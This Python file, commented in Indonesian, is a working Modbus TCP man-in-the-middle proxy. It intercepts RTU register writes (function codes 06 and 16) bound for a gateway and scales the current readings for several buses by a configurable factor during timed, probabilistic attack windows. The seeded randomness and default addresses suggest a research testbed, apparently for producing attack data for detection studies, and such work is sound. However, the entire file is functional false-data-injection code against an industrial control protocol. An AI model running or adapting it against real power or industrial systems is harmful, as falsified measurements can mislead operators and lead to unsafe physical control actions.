from __future__ import annotations

# Proxy Modbus TCP untuk MITM: frame dari RTU diteruskan ke gateway, tetapi nilai
# register arus (I) dapat dimanipulasi sebelum sampai ke gateway.
import os
import random
import select
import socket
import threading
import time
from typing import Optional

# Peta register harus sama dengan RTU/gateway; proxy hanya mengubah register I.
GATEWAY_IP = os.environ.get("MITM_GATEWAY_IP", "10.0.2.2")
MODBUS_PORT = 5020
MITM_PROXY_PORT = 50201
MITM_FIXED_SEED = int(os.environ.get("MITM_FIXED_SEED", "424242"))
I_BASE_ADDR = 10
I_SCALE = 30
NUM_BUS = 5
# Perkalian terhadap I asli dari field/RTU (bukan nilai absolut).
I_MANGLE_FACTOR = float(os.environ.get("MITM_I_FACTOR", "1.5"))
# Mekanisme realistis: manipulasi hanya aktif pada jendela waktu tertentu,
# lalu masih disaring probabilitas per-write.
ATTACK_ON_SECONDS = float(os.environ.get("MITM_ATTACK_ON_SECONDS", "5.0"))
ATTACK_OFF_SECONDS = float(os.environ.get("MITM_ATTACK_OFF_SECONDS", "5.0"))
MODIFY_PROBABILITY = float(os.environ.get("MITM_MODIFY_PROBABILITY", "0.5"))
RUN_ID_FILE = "/tmp/mitm_run_id"

# Kunci RNG: beberapa koneksi TCP paralel tidak merusak state random global.
_rng_lock = threading.Lock()
_v_cache_by_bus = {}

def _should_modify_now() -> bool:
    """
    Kombinasi interval waktu + probabilitas:
    - Hanya aktif saat window ON dalam siklus ON/OFF.
    - Saat ON, tiap write dimodifikasi dengan peluang MODIFY_PROBABILITY.
    """
    cycle = ATTACK_ON_SECONDS + ATTACK_OFF_SECONDS
    if cycle <= 0:
        return False
    phase = time.monotonic() % cycle
    if phase >= ATTACK_ON_SECONDS:
        return False
    with _rng_lock:
        return random.random() < MODIFY_PROBABILITY

def _log_mitm_proxy_i(bus: int, i_orig: float, i_new: float, v_before: Optional[float], v_after: Optional[float]):
    """Hook logging manipulasi I; saat ini sengaja no-op agar output proxy tetap ringan."""
    del bus, i_orig, i_new, v_before, v_after

def _pop_modbus_tcp_frame(buf: bytearray) -> Optional[bytes]:
    """Ambil satu frame Modbus TCP lengkap dari buffer stream TCP."""
    if len(buf) < 6:
        return None
    length = int.from_bytes(buf[4:6], "big")
    need = 6 + length
    if len(buf) < need:
        return None
    frame = bytes(buf[:need])
    del buf[:need]
    return frame

def _mangle_i_register_value(i_orig_amp: float) -> int:
    """I baru = I asli * I_MANGLE_FACTOR (dibatasi register 16-bit)."""
    reg_max = 65535
    amp_max = reg_max / float(I_SCALE)
    factor = max(0.0, I_MANGLE_FACTOR)
    i_amp = max(0.0, i_orig_amp) * factor
    i_amp = min(amp_max, i_amp)
    val = int(round(i_amp * I_SCALE))
    return min(reg_max, max(0, val))

def _mangle_client_to_server(frame: bytes) -> bytes:
    """Ubah payload write register Modbus dari client sebelum diteruskan ke gateway."""
    if len(frame) < 8:
        return frame
    length = int.from_bytes(frame[4:6], "big")
    if 6 + length > len(frame) or length < 2:
        return frame
    unit = frame[6]
    pdu = bytearray(frame[7:])
    fc = pdu[0]

    # FC06 menulis satu register; digunakan RTU saat mengirim nilai per bus.
    if fc == 0x06 and len(pdu) >= 5:
        addr = (pdu[1] << 8) | pdu[2]
        if 0 <= addr < NUM_BUS:
            _v_cache_by_bus[addr + 1] = ((pdu[3] << 8) | pdu[4]) / 1000.0
        if I_BASE_ADDR <= addr < I_BASE_ADDR + NUM_BUS:
            old_val = (pdu[3] << 8) | pdu[4]
            i_orig = old_val / I_SCALE
            bus = addr - I_BASE_ADDR + 1
            v_before = _v_cache_by_bus.get(bus)
            if _should_modify_now():
                new_val = _mangle_i_register_value(i_orig)
                pdu[3] = (new_val >> 8) & 0xFF
                pdu[4] = new_val & 0xFF
                i_after = new_val / I_SCALE
                print(
                    f"[modbus-proxy] FC06 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {i_after:.3f}A",
                    flush=True,
                )
            else:
                i_after = i_orig
            _log_mitm_proxy_i(bus, i_orig, i_after, v_before, v_before)
    # FC16 menulis banyak register; setiap register I di rentang target diproses.
    elif fc == 0x10 and len(pdu) >= 6:
        start = (pdu[1] << 8) | pdu[2]
        count = (pdu[3] << 8) | pdu[4]
        bytecount = pdu[5]
        if len(pdu) < 6 + bytecount or bytecount != count * 2:
            return bytes(frame)
        for i in range(count):
            addr = start + i
            if 0 <= addr < NUM_BUS:
                lo_v = 6 + 2 * i
                _v_cache_by_bus[addr + 1] = ((pdu[lo_v] << 8) | pdu[lo_v + 1]) / 1000.0
            if I_BASE_ADDR <= addr < I_BASE_ADDR + NUM_BUS:
                lo = 6 + 2 * i
                old_val = (pdu[lo] << 8) | pdu[lo + 1]
                i_orig = old_val / I_SCALE
                bus = addr - I_BASE_ADDR + 1
                v_before = _v_cache_by_bus.get(bus)
                if _should_modify_now():
                    new_val = _mangle_i_register_value(i_orig)
                    pdu[lo] = (new_val >> 8) & 0xFF
                    pdu[lo + 1] = new_val & 0xFF
                    i_after = new_val / I_SCALE
                    print(
                        f"[modbus-proxy] FC16 I mangle bus={bus} addr={addr} {i_orig:.3f}A -> {i_after:.3f}A",
                        flush=True,
                    )
                else:
                    i_after = i_orig
                _log_mitm_proxy_i(bus, i_orig, i_after, v_before, v_before)

    new_len = 1 + len(pdu)
    mbap = frame[:4] + new_len.to_bytes(2, "big") + bytes([unit])
    return mbap + bytes(pdu)

def _relay_pair(client: socket.socket, upstream: socket.socket):
    """Relay dua arah; hanya arah client->server yang dimodifikasi."""
    cbuf = bytearray()
    try:
        while True:
            r, _, _ = select.select([client, upstream], [], [], 120.0)
            if not r:
                break
            if upstream in r:
                chunk = upstream.recv(65536)
                if not chunk:
                    break
                client.sendall(chunk)
            if client in r:
                chunk = client.recv(65536)
                if not chunk:
                    break
                cbuf.extend(chunk)
                while True:
                    adu = _pop_modbus_tcp_frame(cbuf)
                    if adu is None:
                        break
                    upstream.sendall(_mangle_client_to_server(adu))
    finally:
        for s in (client, upstream):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                s.close()
            except OSError:
                pass

def _mitm_client_handler(client: socket.socket, _addr):
    """Buat koneksi upstream ke gateway untuk satu koneksi client RTU."""
    try:
        upstream = socket.create_connection((GATEWAY_IP, MODBUS_PORT), timeout=15)
        upstream.settimeout(None)
        client.settimeout(None)
        _relay_pair(client, upstream)
    except Exception as e:
        print(f"[modbus-proxy] upstream error: {e}", flush=True)
        try:
            client.close()
        except OSError:
            pass

def main():
    """Start listener proxy dan tangani tiap koneksi RTU dalam thread terpisah."""
    random.seed(MITM_FIXED_SEED)
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind(("0.0.0.0", MITM_PROXY_PORT))
    ls.listen(32)
    print(
        f"[modbus-proxy] listen 0.0.0.0:{MITM_PROXY_PORT} -> {GATEWAY_IP}:{MODBUS_PORT} "
        f"I regs {I_BASE_ADDR}..{I_BASE_ADDR + NUM_BUS - 1} factor={I_MANGLE_FACTOR} "
        f"fixed_seed={MITM_FIXED_SEED} on={ATTACK_ON_SECONDS}s off={ATTACK_OFF_SECONDS}s "
        f"p={MODIFY_PROBABILITY}",
        flush=True,
    )
    while True:
        try:
            c, addr = ls.accept()
            threading.Thread(target=_mitm_client_handler, args=(c, addr), daemon=True).start()
        except Exception as e:
            print(f"[modbus-proxy] accept error: {e}", flush=True)
            time.sleep(0.5)

if __name__ == "__main__":
    main()
